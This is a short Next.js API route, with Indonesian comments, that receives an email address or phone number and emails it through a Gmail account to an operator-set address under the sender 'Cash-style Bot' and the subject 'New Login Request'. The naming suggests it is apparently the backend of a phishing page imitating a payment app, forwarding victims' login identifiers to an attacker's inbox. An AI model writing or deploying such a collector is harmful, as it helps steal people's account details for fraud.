import nodemailer from "nodemailer";

export async function POST(req) {
  try {
    const { email, phone } = await req.json();

    // Pastikan salah satu ada
    if (!email && !phone) {
      return new Response(
        JSON.stringify({ success: false, message: "Email atau Phone harus diisi" }),
        { status: 400 }
      );
    }

    // Buat pesan sesuai field yang ada
    let text = "";
    if (email) text = `Email: ${email}`;
    if (phone) text = `Phone: ${phone}`;

    // Transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_USER,
        pass: process.env.MAIL_PASS,
      },
    });

    const mailOptions = {
      from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
      to: process.env.MAIL_TO,
      subject: "New Login Request",
      text,
    };

    await transporter.sendMail(mailOptions);

    return new Response(JSON.stringify({ success: true }), { status: 200 });
  } catch (error) {
    console.error("SendMail Error:", error);
    return new Response(
      JSON.stringify({ success: false, message: "Internal server error" }),
      { status: 500 }
    );
  }
}
